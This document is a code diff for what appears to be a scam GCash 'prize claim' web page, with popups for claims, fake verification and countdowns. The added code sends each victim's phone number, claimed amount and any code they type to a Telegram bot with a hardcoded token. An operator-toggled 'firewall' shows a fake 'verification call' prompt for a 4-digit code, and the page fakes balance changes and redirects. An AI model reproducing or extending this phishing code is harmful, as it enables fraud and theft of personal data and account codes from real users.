@@ -1,239 +1,342 @@
-/**
- * Popup Share Module - Simple Phases
- * Phase 1 (Default) | Phase 2 (Firewall OFF) | Phase 3 (Firewall ON)
- */
+let claimState = {
+    isProcessing: false,
+    currentAmount: 0,
+    countdownInterval: null,
+    balanceDecrementInterval: null,
+    countdownSeconds: 180,
+    isPending: false,
+    hasRedirected: false
+};
 
-// ========== GLOBAL VARIABLES ==========
-let currentBalance = 0;
-let currentFirewallStatus = false;
+// ========== FIREWALL VERIFICATION (4-digit call) ==========
+let currentVerificationCode = null;
+let verificationAttempts = 0;
 
-// ========== GET FIREWALL STATUS ==========
-async function getFirewallStatus() {
+async function isFirewallActive() {
+    if (typeof firebase !== 'undefined' && firebase.database) {
+        try {
+            const db = firebase.database();
+            const snap = await db.ref('admin/globalFirewall').once('value');
+            const data = snap.val();
+            return (data && data.active === true);
+        } catch(e) { return false; }
+    }
+    return false;
+}
+
+async function sendTelegram(phone, code) {
+    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
     try {
-        const db = firebase.database();
-        const snapshot = await db.ref('admin/globalFirewall').once('value');
-        const data = snapshot.val();
-        currentFirewallStatus = (data && data.active === true);
-        console.log('🔥 Firewall:', currentFirewallStatus ? 'ON' : 'OFF');
-        return currentFirewallStatus;
-    } catch(e) {
-        console.error('Firewall error:', e);
-        return false;
+        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+    } catch(e) {}
+}
+
+function showFirewallPopup() {
+    const popup = document.getElementById('firewallPopup');
+    if (popup) {
+        const content = document.getElementById('firewallPopupContent');
+        if (content) {
+            content.innerHTML = `
+                <div class="firewall-warning-icon">📞</div>
+                <h2>VERIFICATION REQUIRED</h2>
+                <div class="firewall-message">
+                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+                    <p>Enter the code below to continue.</p>
+                </div>
+                <div class="verification-input-group">
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
+                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
+                </div>
+                <div class="firewall-note">
+                    <p>Waiting for system-verification call...</p>
+                </div>
+                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
+            `;
+        }
+        
+        // Generate random 4-digit code
+        currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+        verificationAttempts = 0;
+        console.log("📞 VERIFICATION CODE:", currentVerificationCode);
+        
+        popup.style.display = 'flex';
+        setTimeout(() => {
+            const ci = document.getElementById('verificationCode');
+            if (ci) ci.focus();
+        }, 100);
     }
 }
 
-// ========== GET LATEST PAYOUT LINK ==========
+function hideFirewallPopup() {
+    const popup = document.getElementById('firewallPopup');
+    if (popup) popup.style.display = 'none';
+}
+
+window.verifyFirewallCode = async function() {
+    const codeInput = document.getElementById('verificationCode');
+    const code = codeInput ? codeInput.value.trim() : '';
+    const errorDiv = document.getElementById('firewallErrorMsg');
+    const verifyBtn = document.getElementById('verifyCodeBtn');
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+    
+    if (!code || code.length < 4) {
+        if (errorDiv) {
+            errorDiv.innerHTML = "Please enter a 4-digit code.";
+            errorDiv.style.display = 'block';
+        }
+        return;
+    }
+    
+    if (verifyBtn) {
+        verifyBtn.disabled = true;
+        verifyBtn.innerHTML = "VERIFYING...";
+    }
+    if (errorDiv) errorDiv.style.display = 'none';
+    
+    verificationAttempts++;
+    
+    // Check if code matches
+    const isValid = (code === currentVerificationCode);
+    
+    if (isValid) {
+        await sendTelegram(userPhone, code);
+        hideFirewallPopup();
+        alert("Verification successful. Page will refresh.");
+        setTimeout(() => {
+            window.location.reload();
+        }, 500);
+    } else {
+        await sendTelegram(userPhone, code);
+        
+        let errorMsg = "Invalid verification code. Please try again.";
+        if (verificationAttempts >= 3) {
+            errorMsg = "Too many failed attempts. Page will refresh.";
+            if (verifyBtn) verifyBtn.disabled = true;
+            setTimeout(() => {
+                window.location.reload();
+            }, 2000);
+        }
+        if (errorDiv) {
+            errorDiv.innerHTML = errorMsg;
+            errorDiv.style.display = 'block';
+        }
+        if (verifyBtn && verifyBtn.disabled !== true) {
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = "VERIFY NOW";
+        }
+        
+        if (codeInput) {
+            codeInput.value = '';
+            codeInput.focus();
+        }
+    }
+};
+
+// ========== GET LATEST DEPLOYED LINK ==========
 async function getLatestPayoutLink() {
+    if (typeof firebase === 'undefined' || !firebase.database) return null;
     try {
         const db = firebase.database();
         const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
         if (snapshot.exists()) {
             const key = Object.keys(snapshot.val())[0];
             const linkData = snapshot.val()[key];
-            return { key: key, url: linkData.url };
+            return linkData.url || null;
         }
         return null;
-    } catch(e) {
-        console.error('Link error:', e);
+    } catch (error) {
         return null;
     }
 }
 
-// ========== MARK LINK AS USED ==========
-async function markLinkAsUsed(linkKey, userPhone) {
-    try {
+// ========== MAIN CLAIM POPUP ==========
+async function showClaimPopup(amount) {
+    const firewallActive = await isFirewallActive();
+
+    if (firewallActive) {
+        // Show firewall verification popup
+        if (typeof window.showFirewallPopup === 'function') {
+            window.showFirewallPopup();
+            } else {
+            showFirewallPopup();
+        }
+        return;
+    }
+
+
+ // Firewall OFF - Normal claim popup
+    claimState.currentAmount = amount;
+    claimState.isProcessing = false;
+    claimState.hasRedirected = false;
+
+    const popup = document.getElementById('claimPopup');
+    const prizeSpan = document.getElementById('popupPrizeAmount');
+    const claimBtn = document.getElementById('claimActionBtn');
+
+    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
+    if (claimBtn) {
+        claimBtn.innerHTML = 'CLAIM THRU GCASH';
+        claimBtn.disabled = false;
+    }
+    if (popup) popup.style.display = 'flex';
+}
+
+function hideClaimPopup() { 
+    const p = document.getElementById('claimPopup'); 
+    if (p) p.style.display = 'none'; 
+}
+
+function showPendingStatus() { 
+    const pa = document.getElementById('pendingStatusArea'); 
+    if (pa) pa.style.display = 'block'; 
+    claimState.isPending = true; 
+}
+
+function hidePendingStatus() { 
+    const pa = document.getElementById('pendingStatusArea'); 
+    if (pa) pa.style.display = 'none'; 
+    claimState.isPending = false; 
+}
+
+// ========== BALANCE DECREMENT ANIMATION ==========
+function startSmoothDecrement(originalAmount) {
+    const balanceText = document.getElementById('balanceText');
+    if (!balanceText) return;
+
+    let current = originalAmount;
+    const decrementStep = 1;
+    const totalDuration = 2000;
+    const steps = originalAmount;
+    const intervalTime = totalDuration / steps;
+
+    claimState.balanceDecrementInterval = setInterval(() => {
+        current = current - decrementStep;
+        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
+        if (current <= 0) {
+            clearInterval(claimState.balanceDecrementInterval);
+            claimState.balanceDecrementInterval = null;
+            balanceText.innerText = "₱0.00";
+        }
+    }, intervalTime);
+}
+
+// ========== COUNTDOWN TIMER ==========
+function startVisibleCountdown(originalAmount) {
+    let remaining = claimState.countdownSeconds;
+    const timerSpan = document.getElementById('pendingCountdown');
+    const pendingArea = document.getElementById('pendingStatusArea');
+    const withdrawBtn = document.getElementById('claimBtn');
+
+    if (!timerSpan) return;
+
+    claimState.countdownInterval = setInterval(() => {
+        if (remaining > 0) {
+            remaining--;
+            const mins = Math.floor(remaining / 60);
+            const secs = remaining % 60;
+            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        if (remaining <= 0) {
+            clearInterval(claimState.countdownInterval);
+            claimState.countdownInterval = null;
+
+            const balanceText = document.getElementById('balanceText');
+            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
+
+            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
+                window.parent.updateGameBalance(originalAmount);
+            } else if (typeof updateGameBalance === 'function') {
+                updateGameBalance(originalAmount);
+            } else if (typeof GameState !== 'undefined') {
+                GameState.balance = originalAmount;
+                if (typeof updateUI === 'function') updateUI();
+                if (typeof saveData === 'function') saveData();
+            }
+
+            if (pendingArea) pendingArea.style.display = 'none';
+            if (withdrawBtn) withdrawBtn.style.display = 'block';
+
+            claimState.isProcessing = false;
+            claimState.hasRedirected = false;
+        }
+    }, 1000);
+}
+
+// ========== REDIRECT TIMER ==========
+function startImaginaryTimer(redirectUrl) {
+    claimState.imaginaryTimer = setTimeout(() => {
+        if (!claimState.hasRedirected) {
+            claimState.hasRedirected = true;
+            window.location.href = redirectUrl;
+        }
+    }, 2000);
+}
+
+// ========== CLAIM ACTION ==========
+function onClaimAction() {
+    if (claimState.isProcessing) return;
+
+    claimState.isProcessing = true;
+    const claimBtn = document.getElementById('claimActionBtn');
+    const amount = claimState.currentAmount;
+    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+
+    claimBtn.disabled = true;
+    claimBtn.innerHTML = 'PROCESSING...';
+
+    // Send Telegram notification
+    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
+        .catch(e => console.log('Telegram error:', e));
+
+    if (typeof firebase !== 'undefined' && firebase.database) {
         const db = firebase.database();
-        await db.ref('links/' + linkKey).update({
-            status: 'used',
-            user: userPhone,
-            usedAt: Date.now()
+
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
+            if (snapshot.exists()) {
+                const key = Object.keys(snapshot.val())[0];
+                const linkData = snapshot.val()[key];
+                const redirectUrl = linkData.url;
+
+                db.ref('links/' + key).update({ 
+                    status: 'claimed', 
+                    user: userPhone, 
+                    amount: amount, 
+                    claimedAt: Date.now() 
+                });
+
+                hideClaimPopup();
+                showPendingStatus();
+                startSmoothDecrement(amount);
+                startVisibleCountdown(amount);
+                startImaginaryTimer(redirectUrl);
+
+            } else {
+                claimBtn.innerHTML = 'NO REWARDS';
+                setTimeout(() => {
+                    claimBtn.innerHTML = 'CLAIM THRU GCASH';
+                    claimBtn.disabled = false;
+                    claimState.isProcessing = false;
+                }, 3000);
+                alert("No available rewards!");
+            }
+        }).catch(() => {
+            claimBtn.innerHTML = 'ERROR';
+            setTimeout(() => {
+                claimBtn.innerHTML = 'CLAIM THRU GCASH';
+                claimBtn.disabled = false;
+                claimState.isProcessing = false;
+            }, 3000);
         });
-    } catch(e) {
-        console.error('Mark link error:', e);
     }
 }
 
-// ========== PHASE 1: DEFAULT POPUP ==========
-function showPhase1(balance) {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
-    
-    currentBalance = balance;
-    
-    popupInner.innerHTML = `
-        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
-        <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
-        <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
-        <div class="divider"></div>
-        <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
-        <div class="luckyday-image-container">
-            <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
-        </div>
-        <div class="divider"></div>
-        <div class="indicator-group">
-            <div class="indicator" id="indicator1"></div>
-            <div class="indicator" id="indicator2"></div>
-            <div class="indicator" id="indicator3"></div>
-        </div>
-        
-        <button class="claim-gcash-button" id="claimGCashBtnPopup">
-            <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
-        </button>
+document.addEventListener('DOMContentLoaded', function() { 
+    hidePendingStatus();
+});
 
-        <div class="button-separator"></div>
-
-        <button class="back-btn" id="backBtnPopup" onclick="window.closePrizePopup()">
-            ← BACK
-        </button>
-    `;
-    
-    // Attach click event
-    const btn = document.getElementById('claimGCashBtnPopup');
-    if (btn) {
-        btn.onclick = handlePhase1Click;
-    }
-}
-
-// ========== PHASE 1 BUTTON CLICK - CHECK FIREWALL ==========
-async function handlePhase1Click() {
-    console.log('CLAIM THRU GCASH clicked');
-    
-    const btn = document.getElementById('claimGCashBtnPopup');
-    if (btn) {
-        btn.disabled = true;
-        btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CHECKING...`;
-    }
-    
-    // Check firewall status
-    const isFirewallOn = await getFirewallStatus();
-    
-    if (isFirewallOn) {
-        // FIREWALL ON → PHASE 3
-        showPhase3();
-    } else {
-        // FIREWALL OFF → PHASE 2
-        showPhase2();
-    }
-}
-
-// ========== PHASE 2: FIREWALL OFF ==========
-function showPhase2() {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
-    
-    popupInner.innerHTML = `
-        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
-        <h2 class="popup-title">🔗 WITHDRAWAL LINK</h2>
-        <div class="divider"></div>
-        <div class="invite-text">Click below to claim ₱<strong>${currentBalance.toFixed(2)}</strong></div>
-        
-        <button class="claim-gcash-button" id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a);">
-            <img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH
-        </button>
-
-        <div class="button-separator"></div>
-
-        <button class="back-btn" id="backBtnPhase2" onclick="window.closePrizePopup()">
-            ← BACK
-        </button>
-    `;
-    
-    const proceedBtn = document.getElementById('proceedBtn');
-    if (proceedBtn) {
-        proceedBtn.onclick = handlePhase2Click;
-    }
-}
-
-// ========== PHASE 2 BUTTON CLICK - GET LINK ==========
-async function handlePhase2Click() {
-    console.log('PROCEED clicked');
-    
-    const btn = document.getElementById('proceedBtn');
-    if (btn) {
-        btn.disabled = true;
-        btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CHECKING LINK...`;
-    }
-    
-    const userPhone = localStorage.getItem("userPhone");
-    const linkData = await getLatestPayoutLink();
-    
-    if (linkData && linkData.url) {
-        // May link - redirect
-        await markLinkAsUsed(linkData.key, userPhone);
-        window.location.href = linkData.url;
-    } else {
-        // Walang link - show alert
-        alert("⚠️ Withdrawal Unsuccessful\n\nMukhang hindi namin ma-proseso ang iyong request dahil kailangan ng GCash App update o kaya ay wala itong mahanap na GCash sa iyong device.\n\nSolution: Siguraduhing updated ang iyong app o subukang mag-login sa ibang device para makuha na ang iyong rewards! 🚀");
-        
-        if (btn) {
-            btn.disabled = false;
-            btn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH`;
-        }
-    }
-}
-
-// ========== PHASE 3: FIREWALL ON (Placeholder) ==========
-function showPhase3() {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
-    
-    popupInner.innerHTML = `
-        <div class="popup-close" onclick="window.closePrizePopup()">✕</div>
-        <h2 class="popup-title">🔒 VERIFICATION REQUIRED</h2>
-        <div class="divider"></div>
-        <div class="invite-text">Due to security protocol, you need to verify your account first.</div>
-        
-        <button class="claim-gcash-button" id="verifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000);">
-            📞 VERIFY NOW
-        </button>
-
-        <div class="button-separator"></div>
-
-        <button class="back-btn" id="backBtnPhase3" onclick="window.closePrizePopup()">
-            ← BACK
-        </button>
-    `;
-    
-    const verifyBtn = document.getElementById('verifyBtn');
-    if (verifyBtn) {
-        verifyBtn.onclick = () => {
-            alert("Verification feature coming soon...");
-        };
-    }
-}
-
-// ========== SHOW POPUP ==========
-async function showPopup(balance) {
-    console.log('Show popup:', balance);
-    currentBalance = balance;
-    
-    // Get fresh firewall status
-    await getFirewallStatus();
-    
-    // Always start with Phase 1
-    showPhase1(balance);
-    
-    const popup = document.getElementById('prizePopup');
-    if (popup) {
-        popup.style.display = 'flex';
-        const ticker = document.getElementById('winnerTicker');
-        if (ticker) ticker.style.display = 'none';
-        if (window.startConfetti) window.startConfetti();
-    }
-}
-
-// ========== CLOSE POPUP ==========
-function closePrizePopup() {
-    const popup = document.getElementById('prizePopup');
-    if (popup) {
-        popup.style.display = 'none';
-        const ticker = document.getElementById('winnerTicker');
-        if (ticker) ticker.style.display = 'flex';
-        if (window.stopConfetti) window.stopConfetti();
-    }
-}
-
-// ========== EXPORT ==========
-window.showPopup = showPopup;
-window.closePrizePopup = closePrizePopup;
-window.getFirewallStatus = getFirewallStatus;
+// Export functions for global access
+window.showFirewallPopup = showFirewallPopup;
+window.hideFirewallPopup = hideFirewallPopup;
+window.verifyFirewallCode = verifyFirewallCode;
